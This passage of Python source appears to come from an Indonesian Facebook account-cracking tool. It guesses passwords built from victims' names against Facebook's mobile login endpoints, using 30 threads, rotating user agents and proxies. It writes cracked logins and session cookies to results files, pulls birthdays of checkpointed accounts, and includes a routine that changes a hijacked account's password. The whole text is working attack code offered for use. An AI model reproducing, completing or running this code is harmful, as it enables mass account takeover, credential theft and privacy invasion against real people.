    if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
        for b in resUbah("input"):
            if b.get("name") in but2:
                dat2.update({b.get("name"):b.get("value")})
        dat2.update({"password_new":"".join(mmk)})
        an=session.post(url_mb+link3.get("action"),data=dat2)
        coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
        print(f"\r  {P}[{H}✓{P}] SUCCESSFULLY CHANGED PASSWORD TO:\n  {P}[{H}✓{N}]{H} {user}|{''.join(mmk)}|{coki}{N}")
        open('results/TAP-CROT.txt', 'a').write(f" [✓] {user}|{''.join(mmk)}|{coki}\n")
        cek_apk(session,coki)
def cek_apk(session,cookie):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":cookie}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f"\n  {N}[{M}!{N}] THERE ARE NO EXPIRED APPS ON THIS ACCOUNT")
    else:
        for i in range(len(game)):
            print("   %s%s. %s%s"%(H,i+1,game[i].replace("ADDED TO"," ADDED TO"),N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":cookie}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f"\n  {N}[{M}!{N}] THERE ARE NO EXPIRED APPS ON THIS ACCOUNT")
    else:
        for i in range(len(game)):
            print("   %s%s. %s%s"%(K,i+1,game[i].replace("Expired"," Expired"),N))
class __chigoue__:
    def __init__(self):
        self.id = []
        self.cnt = input(f"\n  [{M}?{P}] ENTER FILE NAME : ")
        self.id = open(self.cnt).read().splitlines()
        jalan(f'  %s[%s•%s] TOTAL ID COLLECTED : %s%s%s' %(N,M,N,H,len(self.id),N))
        ___two___ = ('y')
        if ___two___ in ('yes', 'Yes', 'Y', 'y'):
            self.__pler__()
        else:
            print(f"  [{M}!{P}] The CORRECT INPUT IS KENTOD")
            self.chi(id)
    def __metode__(self, cebok, user, pasw):
        global ok,cp,loop
        sys.stdout.write(f"\r{N}  [DRACULA] {O}{loop}/{len(self.id)}{P} [OK:{H}{len(ok)}{P}] [CP:{K}{len(cp)}{P}] [{H}{'{:.1%}'.format(loop/float(len(self.id)))}{N}] ")
        sys.stdout.flush()
        try:
            for pw in pasw:
                pw = pw.lower()
                session=requests.Session()
                nip=random.choice(prox)
                proxs= {'https': 'socks5://'+nip}
                ua = random.choice(ugen)
                ua2 = random.choice(ugen2)
                session.headers.update({'Host': cebok,'cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                p = session.get('https://'+cebok+'/login/device-based/password/?uid='+user+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
                dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":user,"next":"https://"+cebok+"/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
                koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
                koki+=' m_pixel_ratio=2.625; wd=412x756'
                heade={'Host': cebok,'cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://'+cebok,'content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://'+cebok+'/login/device-based/password/?uid='+user+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
                po = session.post('https://'+cebok+'/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False) #,proxies=proxs)
                if "c_user" in session.cookies.get_dict():
                    cooz = session.cookies.get_dict()
                    coki = 'datr=' + cooz['datr'] + ';' + ('c_user=' + cooz['c_user']) + ';' + ('fr=' + cooz['fr']) + ';' + ('xs=' + cooz['xs'])
                    print(f"\r  {P}[{H}+{P}] {H}Date {waktu}{P}                        \n   ╰──────>{H} {user}|{pw}{P}                 \n   ╰──────>{H} {coki}{P}\n")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('RESULTS/OK-%s-%s-%s.TXT' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                elif 'checkpoint' in session.cookies.get_dict():
                    try:
                        tokenz = open('.token.txt').read()
                        cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
                        month, day, year = cp_ttl.split('/')
                        month = bulan_ttl[month]
                        print("\n");prints(Panel(f"[{K2}+{P2}] DATE : {K2}{waktu}{P2}\n[{K2}+{P2}] STATUS  : {H2}SUCCUSSED{P2}\n[{K2}+{P2}] DATA    : {K2}{user}|{pw}{P2}\n[{K2}CP{P2}] TTL     : {K2}{day} {month} {year}{P2}"))
                        wrt = '%s|%s|%s %s %s' % (user,pw,day,month,year)
                        cp.append(wrt)
                        open('RESULTS/CP-%s-%s-%s.TXT' % (ha, op, ta), 'a').write('%s\n' % wrt)
                        break
                    except (KeyError, IOError):
                        month = ''
                        day   = ''
                        year  = ''
                    except:pass
                    print(f"\r  {P}[{K}+{P}] {K}Date {waktu}{P}              \n   ╰──────>{K} {user}|{pw}{P}                 \n")
                    wrt = '%s|%s' % (user,pw)
                    cp.append(wrt)
                    open('RESULTS/CP-%s-%s-%s.TXT' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
             self.__metode__(cebok, user, pasw)
             
             
    def __pler__(self):
        prints(Panel(f"[{J2}1{P2}]. METHOD FREE FACEBOOK    ────> {K2}FAST CRACK{P2}\n[{J2}2{P2}]. METHOD MBASIC           ────>{M2} SLOW CRACK{P2}\n[{J2}3{P2}]. METHOD MFACEBOOK       ────> {H2}RECOMMENDATION{P2}"))
        __qwp__ = input('  %s[%s•%s] INPUT : '%(P,H,P))
        if __qwp__ == '':
            print('\n  %s[%s!%s] CORRECT INPUT'%(N,M,N));self.__pler__()
        elif __qwp__ in ('1', '01'):
            xx = "free.facebook.com"
            self.kombinasi_pw(xx)
        elif __qwp__ in ('2', '02'):
            xx = "mbasic.facebook.com"
            self.kombinasi_pw(xx)
        elif __qwp__ in ('3', '03'):
            xx = "m.facebook.com"
            self.kombinasi_pw(xx)
        else:
            print('\n  %s[%s!%s] CORRECT INPUT'%(N,M,N));self.__pler__()

    def kombinasi_pw(self,url):
        prints(Panel(f"[{J2}1{P2}]. Name + 123 + 12345\n[{J2}2{P2}]. Name + 123 + 1234 + 12345\n[{J2}3{P2}]. Name + 123 + 1234 + 12345 + additional password"))
        __pas__ = input(f"  [{H}•{P}] Input : ")
        if __pas__ in[""]:
            print(f" {N}[{M}!{N}] DON'T EMPTY KENTOD");self.kombinasi_pw(url)
        elif __pas__ in["1","01"]:
            prints(Panel(f"[{H2}•{P2}] CRACK IS RUNNING ...\n[{H2}•{P2}] Results {H2}OK{P2} STORED IN : {H2}RESULTS/OK-{ha}-{op}-{ta}.TXT{P2 }\n[{H2}•{P2}] RESULTS {K2}CP{P2} STORED IN : {K2}RESULTS/CP-{ha}-{op}-{ta}.TXT{P2}"))
            with AangXD(max_workers=30) as kirim:
                for kiya in self.id:
                   try:
                       uid, name = kiya.split('|')
                       xz = name.split(' ')
                       if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                           pwx = [name, xz[0]+"123", xz[1]]
                       else:
                           pwx = [name, xz[0]+"123", xz[1]]
                       kirim.submit(self.__metode__,url,uid,pwx)
                   except:pass
            hasil(ok,cp)
        elif __pas__ in["2","02"]:
            prints(Panel(f"[{H2}•{P2}] CRACK IS RUNNING ...\n[{H2}•{P2}] Results {H2}OK{P2} stored in : {H2}results/OK-{ha}-{op}-{ta}.txt{P2 }\n[{H2}•{P2}] Results {K2}CP{P2} are stored in : {K2}results/CP-{ha}-{op}-{ta}.txt{P2}"))
            with AangXD(max_workers=30) as kirim:
                for kiya in self.id:
                   try:
                       uid, name = kiya.split('|')
                       xz = name.split(' ')
                       if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                           pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"12345", xz[0]+xz[1]]
                       else:
                           pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"12345", xz[0]+xz[1]]
                       kirim.submit(self.__metode__,url,uid,pwx)
                   except:pass
            hasil(ok,cp)
        elif __pas__ in["3","03"]:
            prints(Panel(f"[{M2}!{P2}] USE {H2}COMMA{P2} AS WORD SEPARATOR\n[{M2}!{P2} EXAMPLE : {H2}hot, hot, ex, beautiful{P2}"))
            pw = input(f"  {P}[{M}?{P}] ENTER PASSWORD : ").split(",")
            prints(Panel(f"[{H2}•{P2}] CRACK IS RUNNING ...\n[{H2}•{P2}] RESULTS {H2}OK{P2} STORED IN : {H2}RESULTS/OK-{ha}-{op}-{ta}.TXT{P2 }\n[{H2}•{P2}] RESULTS {K2}CP{P2}  STORED IN : {K2}RESULTS/CP-{ha}-{op}-{ta}.TXT{P2}"))
            with AangXD(max_workers=30) as kirim:
                for kiya in self.id:
                   try:
                       uid, name = kiya.split('|')
                       xz = name.split(' ')
                       if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                           xxx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"12345", xz[0]+xz[1]]
                           pwx = xxx + pw
                       else:
                           xxx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"12345", xz[0]+xz[1]]
                           pwx = xxx + pw
                       kirim.submit(self.__metode__,url,uid,pwx)
                   except:pass
            hasil(ok,cp)
        else:
            print(f"\n  {N}[{M}!{N}] CORRECT INPUT");self.kombinasi_pw(url)

if __name__ == '__main__':
    os.system("git pull");kiya()
"))